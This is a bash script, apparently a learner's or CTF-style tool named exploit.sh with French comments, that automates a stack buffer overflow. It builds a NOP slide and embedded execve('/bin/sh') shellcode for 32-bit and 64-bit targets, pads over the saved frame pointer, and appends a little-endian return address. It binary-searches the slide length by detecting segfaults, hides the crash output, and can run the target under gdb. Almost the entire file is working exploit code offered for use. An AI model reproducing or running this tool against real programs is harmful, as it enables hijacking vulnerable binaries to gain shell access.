########################################################################
## Default  : - 64 bit                                                ##
##            - little endian                                         ##
##                                                                    ##
## required : - Address                                               ##
##                                                                    ##
## Option   : - 32 bit                                                ##
##            - big endian                                            ##
########################################################################

## AMELIORATION POSSIBLES:
##  - Compilation d'un shellcode + recup des opcodes (desassemblage) + sauvegarde dans un fichier
##  - Small buffer (shellcode après)

## DONE:
##  - Fusing
##  - Enlever l'option "n"
##  - Long Options
##  - Executable obligatoire
##  - Passage du shellcode en param
##  - cacher les erreurs de segfault
##  - Add debug mode
##  - Add verbose mode

# define all the options (small after "-o", big after --long)
OPTS=`getopt -o bdhs:v --long 32bit,big-endian,help,shellcode,verbose,debug -n 'parse-options' -- "$@"`
eval set -- "$OPTS"

# could not parse the options
if [ $? != 0 ]
then
  echo "Failed parsing options." >&2
  exit 1
fi

# parse the options and assign corresponding var
while true; do
  case "$1" in
    -b | --big-endian ) BIG_ENDIAN=true; shift ;;
    -d | --debug ) DEBUG=true; shift ;;
    -h | --help ) HELP=true; shift ;;
    --32bit ) BIT32=true; shift ;;
    -s | --SHELLCODE ) SHELLCODE="$2"; shift; shift ;;
    -v | --verbose ) VERBOSE=true; shift ;;
    -- ) shift; break ;;
    * ) break ;;
  esac
done

# Check that we have given the required params
if [ "$#" -lt 2 ]
then
  echo "USAGE: ./exploit.sh [options] <TARGET_FILE> <ADDRESS>"
  exit 1
fi

if [ $VERBOSE ]; then
  echo '#########################################################'
  echo '##      ____             _         ____      ____      ##'
  echo '##     / __ )____ ______(_)____   /  _/___  / __/___   ##'
  echo '##    / __  / __ `/ ___/ / ___/   / // __ \/ /_/ __ \  ##'
  echo '##   / /_/ / /_/ (__  ) / /__   _/ // / / / __/ /_/ /  ##'
  echo '##  /_____/\__,_/____/_/\___/  /___/_/ /_/_/  \____/   ##'
  echo '##                                                     ##'
  echo '#########################################################'
  echo ""
fi

# assign the 2nd last arg as the target
target=${@: -2: 1}

# if a file is given, take the content as the shellcode
if [ $SHELLCODE ] && [[ -f $SHELLCODE ]]; then
  if [ $VERBOSE ]; then
    echo "Path given for shellcode, reading content of $SHELLCODE"
  fi
  SHELLCODE="$(cat $SHELLCODE)"
fi

if [ $SHELLCODE ] && [ $VERBOSE ]; then
  echo "SHELLCODE=\"$SHELLCODE\""
  echo ""
elif [ $VERBOSE ]; then
  echo "Using default shellcode"
  echo ""
fi


#####################################################################################################
##      ___       __    __                       ____                           __  _              ##
##     /   | ____/ /___/ /_______  __________   / __/___  _________ ___  ____ _/ /_(_)___  ____ _  ##
##    / /| |/ __  / __  / ___/ _ \/ ___/ ___/  / /_/ __ \/ ___/ __ `__ \/ __ `/ __/ / __ \/ __ `/  ##
##   / ___ / /_/ / /_/ / /  /  __(__  |__  )  / __/ /_/ / /  / / / / / / /_/ / /_/ / / / / /_/ /   ##
##  /_/  |_\__,_/\__,_/_/   \___/____/____/  /_/  \____/_/  /_/ /_/ /_/\__,_/\__/_/_/ /_/\__, /    ##
##                                                                                      /____/     ##
#####################################################################################################

if [ -z $BIG_ENDIAN ]; then
  # Get last param and transform it to little endian
  address="$(echo ${@: -1} | tac -rs .. | echo "$(tr -d '\n')")"
  if [ $VERBOSE ]; then
    echo "Address in Little Endian: $address"
  fi
else
  address=${@: -1}
  if [ $VERBOSE ]; then
    echo "Address in Big Endian: $address"
  fi
fi

newaddr=""
length="$(expr length $address)"
length=$(($length-1))
# Format address so it have a \x every two char
for i in $(seq 0 2 $length)
do
  newaddr="$newaddr\x${address:i:2}"
done

if [ $VERBOSE ]; then
  echo "Address in hexadecimal: \"$newaddr\""
  echo ""
fi


######################################################################
##      ___              __       _____      __  __  _              ##
##     /   |  __________/ /_     / ___/___  / /_/ /_(_)___  ____ _  ##
##    / /| | / ___/ ___/ __ \    \__ \/ _ \/ __/ __/ / __ \/ __ `/  ##
##   / ___ |/ /  / /__/ / / /   ___/ /  __/ /_/ /_/ / / / / /_/ /   ##
##  /_/  |_/_/   \___/_/ /_/   /____/\___/\__/\__/_/_/ /_/\__, /    ##
##                                                       /____/     ##
######################################################################

if [ $BIT32 ]; then
  ebp="yyyyyyyyAAAA" # the "y" are padding only necessary for 32 bit
  arch="32"
  if [ -z $SHELLCODE ]; then
    SHELLCODE='\x31\xdb\x8d\x43\x17\x99\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80'
    LEN=$(echo -n -e $SHELLCODE | wc -c)
  fi
else
  ebp="AAAAAAAA"
  arch="64"
  if [ -z $SHELLCODE ]; then
    SHELLCODE='\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' # shellcode
    LEN=$(echo -n -e $SHELLCODE | wc -c)
  fi
fi

if [ $VERBOSE ]; then
  echo "Architecture was $arch, so ebp is set to: $ebp ($(($arch/8)) characters)"
  if [ $LEN ]; then
    echo ""
    echo "SHELLCODE length: $LEN"
    echo "SHELLCODE=\"$SHELLCODE\""
  fi
  echo ""
  echo ""
  echo ""
  echo ""
  echo '##############################################'
  echo '##      ________  _______ _____   ________  ##'
  echo '##     / ____/ / / / ___//  _/ | / / ____/  ##'
  echo '##    / /_  / / / /\__ \ / //  |/ / / __    ##'
  echo '##   / __/ / /_/ /___/ // // /|  / /_/ /    ##'
  echo '##  /_/    \____//____/___/_/ |_/\____/     ##'
  echo '##                                          ##'
  echo '##############################################'
  echo ""
fi

##############################################
##      ________  _______ _____   ________  ##
##     / ____/ / / / ___//  _/ | / / ____/  ##
##    / /_  / / / /\__ \ / //  |/ / / __    ##
##   / __/ / /_/ /___/ // // /|  / /_/ /    ##
##  /_/    \____//____/___/_/ |_/\____/     ##
##                                          ##
##############################################

min=0
max=10
current=10

while true
do

  # print $current times a \x90 char
  slide="$(printf "\\\x90%0.s" $(seq 1 $current))"

  if [ $VERBOSE ]; then
    echo "Min: $min"
    echo "Max: $max"
    echo "Current: $current"
    $($target "$(echo -n -e "$slide$SHELLCODE$ebp")" 2>/dev/null) 2>/dev/null
    ret=$?
  else
    $($target "$(echo -n -e "$slide$SHELLCODE$ebp")" 2>&1 1>/dev/null) 2>/dev/null
    ret=$?
  fi

  # Si min est max sont à 1 d'équart, nous avons trouver notre nombre
  if [ $min -eq $(($max-1)) ]
  then
    break

  # Pas de segfault
  elif [ $ret -ne 139 ]
  then

    # Nous sommes dans le cas où nous avons déjà trouvé le maximum
    # mais que le nombre recherché est plus grand que le current

    # Nous allons donc déplacer le minimum au current et le current
    # à la moitier de l'interval current <=> max
    if [ $current -lt $max ]
    then
      min=$current
      current=$(($current+(($max-$current)/2)))

    # Nous n'avons pas encore trouvé le maximum
    else
      min=$current
      current=$(($current*2))
      max=$current
    fi


  # Il y a une segfault
  else
    echo "ret = $ret"
    if [ $VERBOSE ]; then
      echo "Segfault detected at current=$current"
    fi

    # Nous sommes dans le cas où le maximum à déjà été trouvé
    # mais que le nombre recherché est plus petit que le current

    # Nous allons donc déplacer le maximum au curent et le current
    # à la moitier de l'interval min <=> current
    if [ $current -lt $max ]
    then
      max=$current
      current=$(($min+(($max-$min)/2)))
    else
      current=$(($current-$current/4))
    fi
  fi
  if [ $VERBOSE ]; then
    echo ""
  fi
done

if [ $DEBUG ]; then
  target="gdb --args "$target""

  if [ $VERBOSE ]; then
    echo ""
    echo ""
    echo ""
    echo '########################################'
    echo '##      ____       __                 ##'
    echo '##     / __ \___  / /_  __  ______ _  ##'
    echo '##    / / / / _ \/ __ \/ / / / __ `/  ##'
    echo '##   / /_/ /  __/ /_/ / /_/ / /_/ /   ##'
    echo '##  /_____/\___/_.___/\__,_/\__, /    ##'
    echo '##                         /____/     ##'
    echo '########################################'
  fi
fi

# need to understand why
if [ $BIT32 ]; then
  slide="\x90\x90\x90\x90\x90$slide"
fi

if [ $VERBOSE ]; then
  echo ""
  echo -n "Total size: "
  echo -n -e "$slide$SHELLCODE$ebp$newaddr" | wc -c
  echo ""
  echo "full param: \"$slide$SHELLCODE$ebp$newaddr\""
  $target "$(echo -n -e "$slide$SHELLCODE$ebp$newaddr")"
  echo $?
else
  $target "$(echo -n -e "$slide$SHELLCODE$ebp$newaddr")"
fi
